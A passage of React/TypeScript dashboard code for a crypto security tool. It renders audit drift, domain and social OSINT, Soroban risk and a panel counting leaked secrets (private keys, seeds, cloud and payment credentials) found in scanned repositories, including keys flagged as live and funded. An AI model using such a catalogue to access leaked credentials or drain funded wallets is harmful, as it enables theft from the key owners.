                                {ni.file}{ni.line ? `:${ni.line}` : ""}
                              </code>
                            </div>
                          ))}
                        </div>
                      </div>
                    )}

                    {result.comparison.unaudited_files?.length > 0 && (
                      <div className="pt-1">
                        <p className="mb-1 text-[10px] uppercase text-muted-foreground font-bold">
                          {isRu ? `Файлы вне области аудита (${result.comparison.unaudited_files_count}):` : `Files Outside Audit Scope (${result.comparison.unaudited_files_count}):`}
                        </p>
                        <div className="flex flex-wrap gap-1.5">
                          {result.comparison.unaudited_files.slice(0, 15).map((uf: string, ufi: number) => (
                            <code key={ufi} className="rounded border border-border bg-card px-2 py-0.5 text-[10px] text-muted-foreground">
                              {uf}
                            </code>
                          ))}
                        </div>
                      </div>
                    )}
                  </div>
                )}

                {/* Parsed Audit Reports */}
                {result.parsed_audits?.length > 0 && (
                  <div>
                    <p className="mb-2 text-[10px] uppercase tracking-wider text-primary font-semibold">
                      📄 {isRu ? "Разобранные аудиторские отчёты в репозитории" : "Parsed Audit Reports in Repository"}
                    </p>
                    <div className="space-y-2">
                      {result.parsed_audits.map((pa: any, idx: number) => (
                        <div key={idx} className="rounded-lg border border-border bg-background p-3 space-y-2">
                          <div className="flex flex-wrap items-center justify-between gap-2">
                            <div>
                              <span className="font-bold text-foreground">{pa.auditor}</span>
                              <span className="ml-2 text-muted-foreground">({pa.file})</span>
                            </div>
                            <div className="flex items-center gap-3 text-[11px]">
                              <span className="text-muted-foreground">{pa.date}</span>
                              <span>
                                C:<b className="text-destructive">{pa.critical}</b> H:<b className="text-primary">{pa.high}</b> M:{pa.medium} L:{pa.low}
                              </span>
                            </div>
                          </div>
                          {pa.findings?.length > 0 && (
                            <div className="grid grid-cols-1 gap-1 sm:grid-cols-2 pt-1 border-t border-border/60">
                              {pa.findings.slice(0, 6).map((pf: any, pfi: number) => (
                                <div key={pfi} className="truncate text-[10px] text-muted-foreground">
                                  • <b className="text-foreground">[{pf.severity}]</b> {pf.title}
                                </div>
                              ))}
                            </div>
                          )}
                        </div>
                      ))}
                    </div>
                  </div>
                )}

                {/* Git Drift Section */}
                {result.drift && (
                  <div className="rounded-xl border border-border bg-background p-4 space-y-2.5">
                    <div className="flex flex-wrap items-center justify-between gap-2">
                      <span className="font-bold text-primary uppercase text-[11px]">
                        🔄 Post-Audit Git Drift ({result.drift.audit_commit?.slice(0, 8) || "baseline"} → {result.drift.current_commit?.slice(0, 8)})
                      </span>
                      <span className="text-[11px] text-muted-foreground">
                        {result.drift.commits_since_audit ? `${result.drift.commits_since_audit} commits · ` : ""}
                        +{result.drift.files_added} added · ~{result.drift.files_modified} modified · -{result.drift.files_removed} removed
                        {result.drift.requires_reaudit ? " · ⚠️ RE-AUDIT RECOMMENDED" : ""}
                      </span>
                    </div>
                    {result.drift.new_contracts?.length > 0 && (
                      <p className="text-[11px] text-destructive">
                        <b>{isRu ? "Новые контракты после аудита:" : "New contracts since audit:"}</b>{" "}
                        {result.drift.new_contracts.slice(0, 12).join(", ")}
                      </p>
                    )}
                    {result.drift.modified_contracts?.length > 0 && (
                      <p className="text-[11px] text-muted-foreground">
                        <b className="text-foreground">{isRu ? "Изменённые контракты:" : "Modified contracts:"}</b>{" "}
                        {result.drift.modified_contracts
                          .slice(0, 12)
                          .map((mc: any) => (typeof mc === "string" ? mc : mc.file || mc.path || JSON.stringify(mc)))
                          .join(", ")}
                      </p>
                    )}
                    {result.drift.new_admin_functions?.length > 0 && (
                      <p className="text-[11px] text-amber-400">
                        <b>🔐 New Admin Functions Added:</b>{" "}
                        {result.drift.new_admin_functions.map((af: any) => `${af.file} (${af.old_count}→${af.new_count})`).join(", ")}
                      </p>
                    )}
                    {result.drift.removed_access_control?.length > 0 && (
                      <p className="text-[11px] text-destructive font-bold">
                        🚨 Access Control Removed:{" "}
                        {result.drift.removed_access_control.map((ac: any) => `${ac.file} (${ac.old_count}→${ac.new_count})`).join(", ")}
                      </p>
                    )}
                  </div>
                )}

                {/* Recent Git Commits */}
                {result.recent_commits?.length > 0 && (
                  <div className="rounded-xl border border-border bg-background p-4 space-y-2">
                    <p className="text-[10px] uppercase tracking-wider text-primary font-bold">
                      🕒 {isRu ? "Последние коммиты в репозитории (Git Log)" : "Recent Repository Commits (Git Log)"}
                    </p>
                    <div className="space-y-1 max-h-44 overflow-y-auto">
                      {result.recent_commits.map((cm: any, cmi: number) => (
                        <div key={cmi} className="flex items-center justify-between gap-2 rounded border border-border bg-card px-2.5 py-1.5 text-[11px]">
                          <div className="flex items-center gap-2 min-w-0 flex-1">
                            <code className="text-primary font-bold shrink-0">{cm.hash}</code>
                            <span className="truncate text-foreground">{cm.message}</span>
                          </div>
                          <span className="text-[10px] text-muted-foreground shrink-0">
                            {cm.author} · {cm.date}
                          </span>
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </div>
            </>
          ) : (
            <>
              <div className="grid grid-cols-3 gap-3">
                {[
                  { k: "Δ Total", v: result.delta_total },
                  { k: "Δ Critical", v: result.delta_critical },
                  { k: "Δ High", v: result.delta_high },
                ].map((c, i) => (
                  <div key={i} className="rounded-xl border border-border bg-card p-4 text-center">
                    <p className="font-mono text-[10px] uppercase tracking-wider text-muted-foreground">{c.k}</p>
                    <p className={`mt-1 font-mono text-xl font-bold ${Number(c.v) > 0 ? "text-destructive" : Number(c.v) < 0 ? "text-primary" : "text-foreground"}`}>
                      {Number(c.v) > 0 ? `+${c.v}` : c.v}
                    </p>
                  </div>
                ))}
              </div>
            </>
          )}
        </div>
      )}

      {result && tool === "social" && (() => {
        const trust = Math.min(100, Math.max(0, Number(result.trust_score ?? 50)));
        const sRisk = Math.min(100, Math.max(0, Number(result.social_score ?? 0)));
        const rdap = result.domain_osint?.rdap || {};
        const dns = result.domain_osint?.dns || {};
        const wb = result.domain_osint?.wayback || {};
        const gh = result.github_osint || {};
        const regMeta = result.registry_meta || {};
        const maxFollowers = Math.max(1, ...(result.platforms || []).map((p: any) => Number(p.followers || 0)));

        const rGauge = 44;
        const cGauge = 2 * Math.PI * rGauge;
        const arcGauge = cGauge * 0.75;
        const trustOffset = arcGauge - (trust / 100) * arcGauge;
        const riskOffset = arcGauge - (sRisk / 100) * arcGauge;

        return (
          <div className="space-y-4 font-mono text-xs">
            {/* HERO COMMAND BRIDGE: DUAL RADIAL GAUGES + RDAP/DNS DOMAIN INTEL + GITHUB ORG */}
            <div className="rounded-xl border border-border bg-card p-5 space-y-4">
              <div className="flex flex-wrap items-center justify-between gap-3 border-b border-border pb-3">
                <div className="flex flex-wrap items-center gap-2.5">
                  <span className="rounded-lg border border-primary/40 bg-primary/15 px-3 py-1 text-xs font-bold text-primary">
                    🕵️‍♂️ OSINT & DOMAIN INTELLIGENCE v2.0
                  </span>
                  <span className="text-base font-black text-foreground">
                    {regMeta.name || result.project_id}
                  </span>
                  {regMeta.symbol && (
                    <span className="rounded bg-emerald-500/15 border border-emerald-500/40 px-2 py-0.5 text-[11px] font-bold text-emerald-300">
                      ${regMeta.symbol}
                    </span>
                  )}
                  {regMeta.category && (
                    <span className="rounded bg-background border border-border px-2 py-0.5 text-[10px] text-muted-foreground">
                      {regMeta.category}
                    </span>
                  )}
                </div>
                <div className="flex flex-wrap items-center gap-2">
                  <span className={`rounded-lg border px-3 py-1 text-[11px] font-bold ${
                    trust >= 70
                      ? "border-emerald-500/50 bg-emerald-500/15 text-emerald-300"
                      : trust >= 45
                      ? "border-amber-500/50 bg-amber-500/15 text-amber-300"
                      : "border-destructive/50 bg-destructive/15 text-destructive"
                  }`}>
                    Class: {result.project_class || "PROFILED"} · Trust {trust}/100
                  </span>
                  {result.domain_osint?.domain && (
                    <button
                      type="button"
                      onClick={() => {
                        setTool("surface");
                        setInput1(result.domain_osint.domain);
                      }}
                      className="rounded-lg border border-cyan-500/40 bg-cyan-500/10 px-2.5 py-1 text-[10px] font-bold text-cyan-300 hover:bg-cyan-500 hover:text-black"
                    >
                      🌐 Скан поддоменов ({result.domain_osint.domain}) ↗
                    </button>
                  )}
                </div>
              </div>

              <div className="grid grid-cols-1 gap-4 lg:grid-cols-12">
                {/* COL 1 (4 cols): Dual SVG Radial Gauges (Trust Score vs Social/Sybil Risk) */}
                <div className="rounded-xl border border-border bg-background/70 p-4 lg:col-span-4 flex flex-col justify-between">
                  <div className="flex items-center justify-between mb-2">
                    <span className="text-[10px] uppercase tracking-wider text-primary font-bold">
                      🎯 {isRu ? "Индекс Доверия vs Соц. Риск" : "Trust Index vs Social Risk"}
                    </span>
                    <span className="text-[10px] text-muted-foreground">{result.signals_total || 0} signals</span>
                  </div>

                  <div className="grid grid-cols-2 gap-3 my-1">
                    {/* Gauge 1: Trust Score */}
                    <div className="flex flex-col items-center rounded-lg border border-border bg-card p-2.5">
                      <div className="relative h-24 w-24">
                        <svg viewBox="0 0 110 110" className="h-full w-full rotate-[135deg]">
                          <circle cx="55" cy="55" r={rGauge} fill="transparent" stroke="hsl(var(--border))" strokeWidth="8" strokeDasharray={`${arcGauge} ${cGauge}`} strokeLinecap="round" />
                          <circle cx="55" cy="55" r={rGauge} fill="transparent" stroke="#10b981" strokeWidth="8" strokeDasharray={`${arcGauge} ${cGauge}`} strokeDashoffset={trustOffset} strokeLinecap="round" />
                        </svg>
                        <div className="absolute inset-0 flex flex-col items-center justify-center">
                          <span className="text-xl font-black text-emerald-400">{trust}</span>
                          <span className="text-[8px] uppercase text-muted-foreground">TRUST</span>
                        </div>
                      </div>
                      <span className="mt-1 text-[10px] font-bold text-foreground">
                        {isRu ? "Репутация / Органика" : "Organic Trust"}
                      </span>
                    </div>

                    {/* Gauge 2: Social / Sybil Risk */}
                    <div className="flex flex-col items-center rounded-lg border border-border bg-card p-2.5">
                      <div className="relative h-24 w-24">
                        <svg viewBox="0 0 110 110" className="h-full w-full rotate-[135deg]">
                          <circle cx="55" cy="55" r={rGauge} fill="transparent" stroke="hsl(var(--border))" strokeWidth="8" strokeDasharray={`${arcGauge} ${cGauge}`} strokeLinecap="round" />
                          <circle cx="55" cy="55" r={rGauge} fill="transparent" stroke={sRisk >= 50 ? "#ef4444" : "#f59e0b"} strokeWidth="8" strokeDasharray={`${arcGauge} ${cGauge}`} strokeDashoffset={riskOffset} strokeLinecap="round" />
                        </svg>
                        <div className="absolute inset-0 flex flex-col items-center justify-center">
                          <span className="text-xl font-black text-amber-400">{sRisk}</span>
                          <span className="text-[8px] uppercase text-muted-foreground">RISK</span>
                        </div>
                      </div>
                      <span className="mt-1 text-[10px] font-bold text-foreground">
                        {isRu ? "Накрутка / Боты" : "Bot / Sybil Risk"}
                      </span>
                    </div>
                  </div>

                  {regMeta.chains?.length > 0 && (
                    <div className="flex flex-wrap items-center gap-1 pt-2 border-t border-border/60 text-[10px]">
                      <span className="text-muted-foreground mr-1">⛓ Chains:</span>
                      {regMeta.chains.map((ch: string, ci: number) => (
                        <span key={ci} className="rounded border border-border bg-card px-1.5 py-0.5 text-foreground">
                          {ch}
                        </span>
                      ))}
                    </div>
                  )}
                </div>

                {/* COL 2 (4 cols): IANA RDAP / WHOIS Domain Age & DNS Security Posture */}
                <div className="rounded-xl border border-border bg-background/70 p-4 lg:col-span-4 flex flex-col justify-between space-y-2.5">
                  <div className="flex items-center justify-between">
                    <span className="text-[10px] uppercase tracking-wider text-primary font-bold">
                      🌐 {isRu ? "RDAP / WHOIS Домен & DNS-Защита" : "RDAP / WHOIS Domain & DNS Posture"}
                    </span>
                    {result.domain_osint?.domain && (
                      <span className="rounded border border-primary/40 bg-primary/10 px-2 py-0.5 text-[10px] font-bold text-primary">
                        {result.domain_osint.domain}
                      </span>
                    )}
                  </div>

                  {result.domain_osint?.domain ? (
                    <div className="space-y-2 text-[11px]">
                      <div className="grid grid-cols-2 gap-2">
                        <div className="rounded-lg border border-border bg-card p-2.5">
                          <p className="text-[9px] uppercase text-muted-foreground">{isRu ? "Возраст домена (RDAP)" : "Domain Age (RDAP)"}</p>
                          <p className="mt-0.5 text-sm font-bold text-emerald-400">
                            {rdap.age_years !== undefined && rdap.age_years !== null
                              ? `${rdap.age_years} ${isRu ? "лет" : "yrs"} (${rdap.age_days}d)`
                              : wb.first_archived_at
                              ? `Archive: ${wb.first_archived_at}`
                              : "—"}
                          </p>
                          <p className="text-[9px] text-muted-foreground">
                            Reg: {rdap.registered_at || wb.first_archived_at || "—"} · Exp: {rdap.expires_at || "—"}
                          </p>
                        </div>
                        <div className="rounded-lg border border-border bg-card p-2.5">
                          <p className="text-[9px] uppercase text-muted-foreground">{isRu ? "Регистратор & DNSSEC" : "Registrar & DNSSEC"}</p>
                          <p className="mt-0.5 truncate font-bold text-foreground" title={rdap.registrar}>
                            {rdap.registrar || "IANA Verified"}
                          </p>
                          <p className="text-[9px] text-muted-foreground">
                            DNSSEC: <b className={rdap.dnssec ? "text-emerald-400" : "text-amber-400"}>{rdap.dnssec ? "SIGNED" : "UNSIGNED"}</b>
                          </p>
                        </div>
                      </div>

                      <div className="rounded-lg border border-border bg-card p-2.5 space-y-1">
                        <div className="flex items-center justify-between">
                          <span className="text-[10px] text-muted-foreground">📧 Mail / MX:</span>
                          <b className="text-foreground">{dns.mail_provider || "None"}</b>
                        </div>
                        <div className="flex items-center justify-between">
                          <span className="text-[10px] text-muted-foreground">🛡️ DMARC / SPF:</span>
                          <span className={dns.dmarc_enforced ? "text-emerald-400 font-bold" : "text-amber-400 font-bold"}>
                            {dns.dmarc_enforced ? "✓ DMARC Enforced" : dns.spf ? "SPF Only (No strict DMARC)" : "No DMARC"}
                          </span>
                        </div>
                        {dns.verified_services?.length > 0 && (
                          <div className="flex flex-wrap gap-1 pt-1 border-t border-border/60">
                            {dns.verified_services.map((vs: string, vi: number) => (
                              <span key={vi} className="rounded bg-primary/15 px-1.5 py-0.5 text-[9px] font-semibold text-primary">
                                ✓ {vs}
                              </span>
                            ))}
                          </div>
                        )}
                      </div>
                    </div>
                  ) : (
                    <p className="text-[11px] text-muted-foreground py-6 text-center">
                      {isRu ? "Введите домен проекта (например aave.com) для RDAP/WHOIS и DNS-разведки." : "Enter a project domain (e.g. aave.com) for RDAP & DNS OSINT."}
                    </p>
                  )}
                </div>

                {/* COL 3 (4 cols): GitHub Organization & Developer Velocity OSINT */}
                <div className="rounded-xl border border-border bg-background/70 p-4 lg:col-span-4 flex flex-col justify-between space-y-2.5">
                  <div className="flex items-center justify-between">
                    <span className="text-[10px] uppercase tracking-wider text-primary font-bold">
                      📦 {isRu ? "GitHub Организация & Разработка" : "GitHub Organization & Dev OSINT"}
                    </span>
                    {gh.owner && (
                      <a href={gh.url} target="_blank" rel="noopener noreferrer" className="text-[10px] font-bold text-primary hover:underline">
                        @{gh.owner} ↗
                      </a>
                    )}
                  </div>

                  {gh.owner ? (
                    <div className="space-y-2 text-[11px]">
                      <div className="grid grid-cols-3 gap-2">
                        <div className="rounded-lg border border-border bg-card p-2 text-center">
                          <p className="text-[9px] text-muted-foreground">Repos</p>
                          <p className="font-bold text-foreground">{gh.public_repos ?? "—"}</p>
                        </div>
                        <div className="rounded-lg border border-border bg-card p-2 text-center">
                          <p className="text-[9px] text-muted-foreground">★ Stars</p>
                          <p className="font-bold text-amber-400">{fmt(gh.total_stars_sample ?? 0, 0)}</p>
                        </div>
                        <div className="rounded-lg border border-border bg-card p-2 text-center">
                          <p className="text-[9px] text-muted-foreground">Created</p>
                          <p className="font-bold text-foreground">{gh.created_at ? gh.created_at.slice(0, 4) : "—"}</p>
                        </div>
                      </div>

                      {gh.top_repos?.length > 0 && (
                        <div className="space-y-1 max-h-28 overflow-y-auto pr-1">
                          {gh.top_repos.slice(0, 3).map((tr: any, ti: number) => (
                            <div key={ti} className="flex items-center justify-between gap-2 rounded border border-border bg-card px-2.5 py-1 text-[10px]">
                              <a href={tr.url} target="_blank" rel="noopener noreferrer" className="font-bold text-primary hover:underline truncate">
                                {tr.name}
                              </a>
                              <span className="text-muted-foreground shrink-0">
                                ★{tr.stars} · {tr.language} · {tr.pushed_at}
                              </span>
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                  ) : (
                    <p className="text-[11px] text-muted-foreground py-6 text-center">
                      {isRu ? "GitHub-организация не привязана или не указана" : "No linked GitHub organization"}
                    </p>
                  )}
                </div>
              </div>

              {/* SOCIAL PLATFORMS AUDIENCE & ENGAGEMENT BARS */}
              {result.platforms?.length > 0 && (
                <div className="rounded-xl border border-border bg-background/70 p-4 space-y-2.5">
                  <p className="text-[10px] uppercase tracking-wider text-primary font-bold">
                    📡 {isRu ? `Карта соцсетей и вовлечённости аудитории (${result.platforms.length})` : `Social Platforms & Engagement Telemetry (${result.platforms.length})`}
                  </p>
                  <div className="grid grid-cols-1 gap-2.5 md:grid-cols-2">
                    {result.platforms.map((p: any, i: number) => {
                      const fol = Number(p.followers || 0);
                      const pctW = Math.min(100, Math.max(6, (fol / maxFollowers) * 100));
                      return (
                        <div key={i} className="rounded-lg border border-border bg-card p-3 space-y-1.5">
                          <div className="flex items-center justify-between gap-2">
                            <div className="flex items-center gap-2 min-w-0">
                              <span className="rounded border border-primary/40 bg-primary/15 px-2 py-0.5 text-[10px] font-bold uppercase text-primary">
                                {p.platform}
                              </span>
                              <a href={p.url} target="_blank" rel="noopener noreferrer" className="truncate text-foreground font-semibold hover:text-primary hover:underline">
                                {p.url} ↗
                              </a>
                            </div>
                            <span className="font-bold text-emerald-400 shrink-0">
                              {fmt(fol, 0)} followers
                            </span>
                          </div>
                          <div className="h-1.5 w-full overflow-hidden rounded-full bg-background border border-border/60">
                            <div className="h-full bg-gradient-to-r from-primary to-emerald-400" style={{ width: `${pctW}%` }} />
                          </div>
                          <div className="flex items-center justify-between text-[10px] text-muted-foreground">
                            <span>Profile: <b className="text-foreground">{p.engagement_profile || p.verdict || "ACTIVE"}</b></span>
                            {p.engagement_rate ? <span>ER: <b className="text-foreground">{p.engagement_rate}%</b></span> : null}
                          </div>
                        </div>
                      );
                    })}
                  </div>
                </div>
              )}

              {/* OSINT SIGNALS */}
              {result.signals?.length > 0 && (
                <div className="space-y-2">
                  <p className="text-[10px] uppercase tracking-wider text-primary font-bold">
                    🚨 {isRu ? `Детерминированные OSINT и Доменные сигналы (${result.signals.length})` : `Detected OSINT & Domain Signals (${result.signals.length})`}
                  </p>
                  <div className="grid grid-cols-1 gap-2 md:grid-cols-2">
                    {result.signals.map((s: any, i: number) => {
                      const sev = String(s.severity || "INFO").toUpperCase();
                      return (
                        <div
                          key={i}
                          className={`rounded-lg border p-3 ${
                            sev === "CRITICAL" || sev === "HIGH" || sev === "NEGATIVE"
                              ? "border-destructive/40 bg-destructive/10"
                              : "border-border bg-background"
                          }`}
                        >
                          <div className="flex items-center justify-between gap-2">
                            <span className="font-bold text-foreground">{s.type}</span>
                            <span className="rounded border border-border bg-card px-2 py-0.5 text-[10px] text-primary font-bold">
                              {s.platform} · {sev}
                            </span>
                          </div>
                          <p className="mt-1 text-[11px] text-muted-foreground leading-relaxed">{s.description}</p>
                        </div>
                      );
                    })}
                  </div>
                </div>
              )}
            </div>
          </div>
        );
      })()}

      {result && tool === "soroban" && (
        <div className="space-y-4">
          <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
            {[
              { k: isRu ? "Вердикт" : "Verdict", v: result.verdict || "—" },
              { k: "Overall Risk", v: `${result.overall_risk_score ?? 0}/100` },
              { k: "Trustlines", v: fmt(result.asset_profile?.trustlines, 0) },
              { k: "Bid Depth", v: `$${fmt(result.orderbook?.bid_depth_usd)}` },
            ].map((c, i) => (
              <div key={i} className="rounded-xl border border-border bg-card p-4">
                <p className="font-mono text-[10px] uppercase tracking-wider text-muted-foreground">{c.k}</p>
                <p className="mt-1 font-mono text-lg font-bold text-foreground">{c.v}</p>
              </div>
            ))}
          </div>
          <div className="rounded-xl border border-border bg-card p-5 font-mono text-xs space-y-2">
            <p className="text-foreground font-bold">{result.target} ({result.target_type})</p>
            {result.verdict_detail && <p className="text-muted-foreground">{result.verdict_detail}</p>}
            {result.asset_profile?.home_domain && (
              <p className="text-primary">Domain: {result.asset_profile.home_domain} · LP Pools: {result.lp_pool_count ?? 0}</p>
            )}
            {result.signals?.length > 0 && (
              <div className="mt-3 space-y-1.5">
                {result.signals.map((s: any, i: number) => (
                  <div key={i} className="rounded-lg border border-border bg-background p-2.5">
                    <div className="flex justify-between">
                      <span className="font-bold text-foreground">{s.title || s.id}</span>
                      <span className="text-muted-foreground">{s.severity}</span>
                    </div>
                    <p className="mt-1 text-muted-foreground">{s.description}</p>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      )}

      {result && tool === "ospec" && (
        <div className="space-y-4">
          {/* OSPEC VISUAL TELEMETRY COMMAND DECK (SVG Donut + Interactive Category Bars + Top Active Signatures) */}
          <div className="grid grid-cols-1 gap-4 lg:grid-cols-12 font-mono text-xs">
            {/* COL 1 (4 cols): SVG Donut Chart of Verified REAL Secrets & Live On-Chain Keys */}
            <div className="rounded-xl border border-border bg-card p-4 lg:col-span-4 flex flex-col justify-between">
              <div className="flex items-center justify-between">
                <span className="text-[10px] uppercase tracking-wider text-primary font-bold">
                  🎯 {isRu ? "Структура боевого пула REAL (L2.5 + Context v6.2)" : "Verified REAL Secret Pool Topology"}
                </span>
                <span className="rounded border border-emerald-500/40 bg-emerald-500/15 px-2 py-0.5 text-[10px] font-bold text-emerald-300">
                  Zero-FP v6.2
                </span>
              </div>

              {(() => {
                const critCnt = Number(result.db_stats?.by_severity?.CRITICAL ?? 0);
                const highCnt = Number(result.db_stats?.by_severity?.HIGH ?? 0);
                const medCnt = Number(result.db_stats?.by_severity?.MEDIUM ?? 0);
                const totReal = Math.max(1, critCnt + highCnt + medCnt);
                const critPct = Math.round((critCnt / totReal) * 100);
                const highPct = Math.round((highCnt / totReal) * 100);
                const medPct = Math.max(0, 100 - critPct - highPct);
                return (
                  <div className="flex items-center gap-4 my-2">
                    <div className="relative h-32 w-32 shrink-0">
                      <svg viewBox="0 0 42 42" className="h-full w-full -rotate-90">
                        <circle cx="21" cy="21" r="15.915" fill="transparent" stroke="hsl(var(--border))" strokeWidth="4.5" />
                        <circle cx="21" cy="21" r="15.915" fill="transparent" stroke="#ef4444" strokeWidth="4.5" strokeDasharray={`${critPct} ${100 - critPct}`} strokeDashoffset="100" />
                        <circle cx="21" cy="21" r="15.915" fill="transparent" stroke="#f59e0b" strokeWidth="4.5" strokeDasharray={`${highPct} ${100 - highPct}`} strokeDashoffset={100 - critPct} />
                        <circle cx="21" cy="21" r="15.915" fill="transparent" stroke="#10b981" strokeWidth="4.5" strokeDasharray={`${medPct} ${100 - medPct}`} strokeDashoffset={100 - critPct - highPct} />
                      </svg>
                      <div className="absolute inset-0 flex flex-col items-center justify-center text-center">
                        <span className="text-sm font-black text-foreground">{fmt(result.db_stats?.real_findings ?? totReal, 0)}</span>
                        <span className="text-[9px] text-emerald-400 font-bold">REAL</span>
                        <span className="text-[9px] text-amber-400">🔥 {fmt(result.db_stats?.live_keys ?? 0, 0)} LIVE</span>
                      </div>
                    </div>

                    <div className="flex-1 space-y-1.5 text-[11px]">
                      <div className="flex items-center justify-between rounded border border-border bg-background px-2.5 py-1.5">
                        <span className="text-red-400 font-bold">🔴 CRITICAL</span>
                        <b>{fmt(critCnt, 0)} ({critPct}%)</b>
                      </div>
                      <div className="flex items-center justify-between rounded border border-border bg-background px-2.5 py-1.5">
                        <span className="text-amber-400 font-bold">🟠 HIGH</span>
                        <b>{fmt(highCnt, 0)} ({highPct}%)</b>
                      </div>
                      <div className="flex items-center justify-between rounded border border-border bg-background px-2.5 py-1.5">
                        <span className="text-emerald-400 font-bold">🔥 LIVE Funded</span>
                        <b>{fmt(result.db_stats?.live_keys ?? 0, 0)} keys</b>
                      </div>
                    </div>
                  </div>
                );
              })()}

              <div className="flex items-center justify-between border-t border-border/60 pt-2 text-[10px] text-muted-foreground">
                <span>📦 Scanned: <b className="text-foreground">{fmt(result.db_stats?.indexed_repos ?? 0, 0)} repos</b></span>
                <span>🎯 With REAL: <b className="text-primary">{fmt(result.db_stats?.real_repos ?? 0, 0)} repos</b></span>
              </div>
            </div>

            {/* COL 2 (4 cols): 6-Family Interactive Distribution Bars */}
            <div className="rounded-xl border border-border bg-card p-4 lg:col-span-4 flex flex-col justify-between">
              <div className="flex items-center justify-between mb-1">
                <span className="text-[10px] uppercase tracking-wider text-primary font-bold">
                  📊 {isRu ? "Распределение по 6 семействам (Клик = Фильтр)" : "6-Family Secret Distribution (Click to Filter)"}
                </span>
                <span className="text-[10px] text-muted-foreground">Click bar</span>
              </div>

              <div className="space-y-2 my-1">
                {[
                  { id: "WEB3_WALLETS_RPC", label: isRu ? "🔑 Кошельки, Сиды & RPC" : "🔑 Wallets, Seeds & RPC", color: "bg-primary" },
                  { id: "CLOUD_DB_BAAS", label: isRu ? "☁️ Базы данных & Облака" : "☁️ Databases & Cloud BaaS", color: "bg-cyan-500" },
                  { id: "AI_VOICE_LLM", label: isRu ? "🤖 AI, LLM & Голосовые" : "🤖 AI, LLM & Voice Agents", color: "bg-purple-500" },
                  { id: "COMMS_MOBILE_OTA", label: isRu ? "📱 TG / Slack / Почта / OTA" : "📱 Comms, Bots & OTA", color: "bg-emerald-500" },
                  { id: "FINTECH_ECOMM", label: isRu ? "💳 Платежи & E-Commerce" : "💳 FinTech & Payments", color: "bg-amber-500" },
                  { id: "WHITEHAT_POS_BIZ", label: isRu ? "🍔 Whitehat: POS & SaaS" : "🍔 Whitehat POS & SaaS", color: "bg-pink-500" },
                ].map((fam) => {
                  const fCnt = Number(result?.category_counts?.[fam.id] ?? 0);
                  const maxFam = Math.max(1, ...Object.values(result?.category_counts || { a: 1 }).map((v: any) => Number(v || 0)));
                  const barW = Math.min(100, Math.max(4, (fCnt / maxFam) * 100));
                  return (
                    <button
                      key={fam.id}
                      type="button"
                      onClick={() => {
                        setOspecCategory(fam.id);
                        setInput1("");
                        runOspecWithFilters({ cat: fam.id, q: "", offset: 0 });
                      }}
                      className="w-full text-left space-y-0.5 group"
                    >
                      <div className="flex justify-between text-[10px]">
                        <span className="text-foreground group-hover:text-primary font-semibold">{fam.label}</span>
                        <b className="text-foreground">{fmt(fCnt, 0)}</b>
                      </div>
                      <div className="h-1.5 w-full overflow-hidden rounded-full bg-background border border-border/60">
                        <div className={`h-full ${fam.color} transition-all duration-500`} style={{ width: `${barW}%` }} />
                      </div>
                    </button>
                  );
                })}
              </div>
            </div>

            {/* COL 3 (4 cols): Top Active Verified Signatures (1-Click Quick Filter Pills) */}
            <div className="rounded-xl border border-border bg-card p-4 lg:col-span-4 flex flex-col justify-between">
              <div className="flex items-center justify-between mb-1">
                <span className="text-[10px] uppercase tracking-wider text-primary font-bold">
                  🔥 {isRu ? "Топ боевых сигнатур в БД (1-Клик Фильтр)" : "Top Verified Signatures (1-Click Filter)"}
                </span>
                {input1 && (
                  <button
                    type="button"
                    onClick={() => {
                      setInput1("");
                      runOspecWithFilters({ q: "", offset: 0 });
                    }}
                    className="text-[10px] text-primary hover:underline"
                  >
                    ✕ Сбросить ({input1})
                  </button>
                )}
              </div>

              <div className="flex flex-wrap gap-1.5 my-1 max-h-40 overflow-y-auto pr-1">
                {(result.kind_stats || []).slice(0, 18).map((ks: any) => {
                  const sk = ks.short_kind || String(ks.kind || "").replace("secret:", "");
                  const isSel = input1 === sk;
                  return (
                    <button
                      key={sk}
                      type="button"
                      onClick={() => {
                        const nextQ = isSel ? "" : sk;
                        setInput1(nextQ);
                        setOspecCategory("ALL");
                        runOspecWithFilters({ q: nextQ, cat: "ALL", offset: 0 });
                      }}
                      className={`rounded-lg border px-2 py-1 text-[10px] font-semibold transition-all ${
                        isSel
                          ? "border-primary bg-primary text-primary-foreground shadow"
                          : "border-border bg-background text-muted-foreground hover:border-primary/50 hover:text-foreground"
                      }`}
                    >
                      {sk} <b className={isSel ? "text-primary-foreground" : "text-primary"}>({ks.real})</b>
                    </button>
                  );
                })}
              </div>

              {result.db_stats?.by_chain && (
                <div className="flex flex-wrap items-center gap-1 pt-2 border-t border-border/60 text-[9px] text-muted-foreground">
                  <span className="text-cyan-400 font-bold">⛓ Chains:</span>
                  {Object.entries(result.db_stats.by_chain)
                    .filter(([ch]) => ch !== "other" && ch !== "undetermined")
                    .slice(0, 6)
                    .map(([ch, cnt]: [string, any]) => (
                      <span key={ch} className="rounded border border-cyan-500/30 bg-cyan-500/10 px-1.5 py-0.5 text-cyan-300">
                        {ch.toUpperCase()}: {cnt}
                      </span>
                    ))}
                </div>
              )}
            </div>
          </div>

          <div className="grid grid-cols-2 gap-3 sm:grid-cols-5">
            {[
              {
                k: isRu ? "🟢 Подтверждённые REAL" : "🟢 Verified REAL",
                v: fmt(result.db_stats?.real_findings ?? result.db_stats?.indexed_findings, 0),
                sub: isRu
                  ? `из ${fmt(result.db_stats?.indexed_findings, 0)} проверенных`
                  : `of ${fmt(result.db_stats?.indexed_findings, 0)} scanned`,
              },
              {
                k: isRu ? "🔥 Живые ключи (LIVE)" : "🔥 Live Verified Keys",
                v: fmt(result.db_stats?.live_keys ?? 0, 0),
                sub: isRu ? "активный баланс / RPC / nonce" : "active on-chain / RPC",
              },
              {
                k: isRu ? "📦 Просканировано репо" : "📦 Scanned Repos",
                v: fmt(result.db_stats?.indexed_repos, 0),
                sub: isRu
                  ? `${fmt(result.db_stats?.real_repos ?? 0, 0)} репо с REAL`
                  : `${fmt(result.db_stats?.real_repos ?? 0, 0)} repos w/ REAL`,
              },
              {
                k: "🔴 Critical (REAL)",
                v: fmt(result.db_stats?.by_severity?.CRITICAL ?? 0, 0),
                sub: isRu ? "приватники / seed / prod" : "privkeys / seeds / prod",
              },
              {
                k: "🟠 High (REAL)",
                v: fmt(result.db_stats?.by_severity?.HIGH ?? 0, 0),
